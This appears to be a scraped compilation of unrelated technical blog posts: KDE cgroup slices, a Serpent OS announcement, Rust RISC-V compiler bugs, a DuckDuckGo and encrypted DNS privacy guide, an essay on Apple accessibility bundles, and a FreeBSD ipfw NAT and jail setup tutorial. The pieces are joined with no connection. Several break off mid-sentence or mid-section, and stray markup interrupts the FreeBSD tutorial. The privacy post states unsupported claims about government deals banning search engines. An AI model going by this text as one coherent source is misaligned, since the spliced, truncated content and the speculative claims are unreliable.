<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

<h3><span>What is DuckDuckGo?</span></h3>



<hr>
<p><a href="https://duckduckgo.com/">DuckDuckGo</a> is a search engine similar to Google but, with a major difference – It does not track you! In the modern era of internet where the knowledge acquired by the entire humankind is available at your fingertips, the rise of corporate and government-funded digital-tracking has become a major threat to people’s privacy.</p>
<p>Almost all major search engines including Google, Bing and Yahoo track&nbsp; you. Google most of all!</p>



<h3><span>Why and how much do they track?</span></h3>



<hr>
<p>The reason to why they track is simple – Money! Most companies that provide their product without a cost to thier users earn on the data they collected about them. The data collected about your search history, websites visited, time spent on a website, etc. is used to profile you and categorize your interests and then sold to advertisement companies to make the profit. This is the same business model that social media companies like facebook, twitter, etc. use to make money off of your data.</p>
<blockquote>
<p><strong><em>In a world with companies offering free services, the consumer becomes their product!</em></strong></p>
</blockquote>
<p>Google not only logs your search history from its search engine but also tracks your activities on various websites you visit by paying them to run their scripts on the site’s webpages.</p>



<h3><span>Don’t believe it?</span></h3>



<hr>
<p>I know it might sound like a conspiracy theory but you’d be amazed to know how easy it is to verify these claims. Simply install a plugin like uBlock Origin (<a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin">For Firefox</a> or <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en-US">For Chrome</a>) that lets you see the domains that a website is trying to connect to from your computer and you’ll find that Google’s and Facebook’s trackers are all over the internet.</p>
<p>When you visit a website, the website’s content is downloaded to your device including HTML page, CSS styling and Java Scripts. The websites paid by Google and Facebook send you some additional Java Scripts along with their contents that connect to Google’s and Facebook’s servers and send your information to them.</p>
<p>This is also the reason why you see ads similar to your search history all over the internet, specially on websites like YouTube, Facebook, Google, Amazon, etc.</p>

<p>The screenshot above is marked with a box that displays that when I visit Standard Chartered’s website, a total of 5 domains get information about my presence on that website. Of these 5 domains, the requests to sc.com and www.sc.com were partially blocked (Red Arrow marked 1), gioip-js.com and googletagmanager.com were completely blocked (Red Arrow Marked 2) and maps.googleapis.com were not at all blocked (Red Arrow Marked 3) by uBlock Origin’s default set of filters. If you’d look a little to the right of that red box, you’d notice that despite 7 requests being blocked in total (13% of all requests on that page), the website was still completely functional and that it did not break.</p>



<h3><span>What’s in it for the government?</span></h3>



<hr>
<p>Frankly, to answer this question is difficult. Sometimes, governments ask these companies to share the data to track their citizens for various reasons. Other times, the governments ask companies like Google to help identify the protestors by disclosing their mobile phone’s GPS location at the time of protests and as a <em>quid pro quo </em>they kill their competition by passing Laws to ban sites like DuckDuckGo. We can never know these answers for sure as these deals are made behind closed doors.</p>



<h3><span>So, what do I do about DuckDuckGo?</span></h3>



<hr>
<p>Well, fortunately the solution to this problem is extremely simple. You can go to the Menu section of Firefox, select Options, go to the “General” settings tab, scroll all the way to the bottom and click the “Settings” button under “Network Settings”.</p>

<p>Besides the two options provided by Firefox, you can also find a list of other HTTPS-enabled privacy-oriented DNS services on <a href="https://www.privacytools.io/providers/dns/">PrivacyTools.io – DNS</a> page.</p>



<h3><span>How Does This Solution Work?</span></h3>



<hr>
<p>To understand how this solution work, we first need to understand how does the DNS work and <a href="https://crackerscreed.org/understanding-ssl-certificates/">how does SSL certificate work</a>. Once you understand that, you’d notice the if your DNS queries are sent over HTTPS, they can only be read by the DNS server and not by your ISP’s firewall. Without reading the your DNS query, they cannot tamper or block its intended response and hence cannot block you from getting its IP address.</p>



<h3><span>Is It A Fool-Proof Solution?</span></h3>



<hr>
<p>The unfortunate answer is No! There are other ways that a government can block a website like IP address based filtering, content based filtering, etc. And even if you bypass these filters and access DuckDuckGo, by no mean you become anonymous over the internet but, switching to an actively-maintained open-sourced browser such as Firefox, installing malware/tracking blocker plugin like uBlock Origin and switching to a privacy-oriented search engine can dramatically reduce your digital footprint. It could be your first step towards a long journey of internet anonymity and digital privacy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>apple doesn’t succeed at making their platforms accessible because they care more, they don’t succeed because they are somehow better at programming</h3>

<p>a capable, thoughtful manager, who is correctly assessing risk vs reward, both qualitatively and quantitatively, who is doing their job well, using all of the experience and skill that brought them to where they are, can, and likely will, decide to ship an app that could be accessible, but is not.</p>

<p>this is not a function of callousness (although they may also be quite callous).</p>

<p>this is not a function of engineering aptitude (plenty of our leading lights have let access fall to the wayside<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> by making solid engineering choices that are completely defensible).</p>

<p>the apple accessibility teams are made up of disciplined, brilliant engineers. they all work incredibly hard on a problem with unimaginable scale. but their brilliance and discipline and hard work, while necessary, are not sufficient.</p>

<p>what matters here, what sets apple apart, is that they figured out how to go last and contain the risk enough to avoid a revolt from other teams or executive leadership. it costs them a lot to do so, has significant, measurable downsides, and requires a significant rethink of what it means to build good software.</p>

<h3>bundles</h3>

<p>some of the code that powers accessibility on apple platforms is just disgusting to look at and to work on.</p>

<p>most of the code that makes apple software accessible lives in what’s called an accessibility bundle. without diving into the minutia of the thing, bundles are a way to load something akin to a plugin into a cocoa app at runtime if an assistive technology is activated. it involves manipulating the app or framework class hierarchy and using objective-c dynamism to read app state and build up a usable accessibility hierarchy. insert a super class here, read an instance variable there, swizzle in a method and store the state for it in associated objects.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p>

<p>bundles are not a good way to build software by any common measure. they don’t make you efficient, or your code correct. the performance can get bad. they’re hard to maintain and involve constant patching to keep them alive. huge chunks of bundle code are thrown away and rewritten multiple times during every major os release.</p>

<p>i found the initial adjustment to working on this code sometimes viscerally upsetting. “i can’t do that!!”, “clearly i should be protecting against…”, “if i do it that way it’ll break when they…”, etc.</p>

<p>the thing is, critically, if a user never activates an assistive technology like voiceover they wouldn’t know bundles even exist. many of the managers at apple don’t know much or care much about accessibility. some of them are borderline hostile to it. the bundles make it possible for the accessibility team to allocate their own resources and set their own priorities with only very limited coordination and fallout contained to people who would benefit most from the upside. they allow the accessibility team to fix the bugs they find, when they find them, with pretty limited opportunities for a manager who’s next promotion is on the line to get cold feet and pull resources or block fixes.</p>

<p>in the model of low end disruption, we can see bundles as a low end entrant, with a product that seems worse, but that solves an important problem in a way that the mature products, by their nature, can’t realistically address.</p>

<p>if the job to be done is “produce easy to understand, correct, maintainable code that engineers who care about those things will enjoy working on” then bundles aren’t even in the competition.</p>

<p>if the job is “manage your team resources responsibly, keep your bug count low, ship your features on time” then bundles aren’t the tool you reach for. why would you load a squirrelly plugin into your own app on purpose?</p>

<p>the chaotic morass of runtime hacks and macros for everything and nearly exclusive dependence on runtime validation<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> make them not just not good, but almost aggressively bad. but if the job they are hired to do is make apps that aren’t accessible, they’re incredible. unparalleled. entirely without peer.</p>

<p>almost all the things a good engineer would do to make bundles less gross would make them worse in unacceptable ways. almost anything a high end product might do to accommodate the kind of autonomy bundles demand would make them unacceptable to their current clients.<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup></p>

<p>apple has a team whose only job is to make things accessible and they have infrastructure that lets that team mostly avoid people who have a different job saying no to them. put those together and you have the most successful accessibility software team (imho) on planet earth.</p>

<h3>the gross stuff isn’t desirable, but is maybe necessary</h3>

<p>anyone who is steeped in universal design that has made it this far has maybe broken out in hives? please just stick with me, it’ll all come out in the wash.</p>

<ul>
<li>well designed apps that take accessibility into consideration from the beginning are better for everyone.</li>
<li>accessible ramps for getting into buildings are better than those terrible lifts they bolt into the sides of stairs in public buildings.</li>
<li>we all benefit from features in society that originate as accessibility affordances, like curb cuts for wheelchairs, that everyone with a stroller can now take for granted.</li>
</ul>


<p>without question these statements are true.</p>

<p>i don’t worry too much about saying things that might make people think i’m a bad engineer or have bad ideas about building software. i do care a lot about not giving people the idea that we should all knock out our accessibility code real quick and sloppy at the end as an afterthought.</p>

<p>my thesis here is that where the effect of failing is very much acute, most of us do not adjust our approach accordingly. likely because we regard assistive technology users as one of many available audiences we may or may not wish to court.</p>

<p>if we ship an app that’s inaccessible, hey we’ll get around to it, we’ve got a roadmap, hasn’t bubbled up yet, software takes time. there are so many bugs in our support tracker and “doesn’t work for blind people” is just a tiny blip.</p>

<p>of course we should be methodical and plan ahead and build our software in a way that is both accessible and maintainable. we should seek to avoid compromising, but should the need to compromise emerge, the balance should unquestionably be tilted towards gross and unmaintainable code where that is the cost of accessibility. if you could fix that missing label but eww i’d have to wire up a very clumsy chain of delegates or fire a notification that clearly violates layering, without question, you should do it.<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup></p>

<p>we should be willing to find a blend of cultural and political and technical workarounds in our organizations that acknowledge that code can’t be allowed to go out the door that isn’t accessible and that a lot of our ideas about technical excellence and what a good engineering manager does wildly miscalculate the cost of our decisions to “do it right”.</p>

		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT

</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
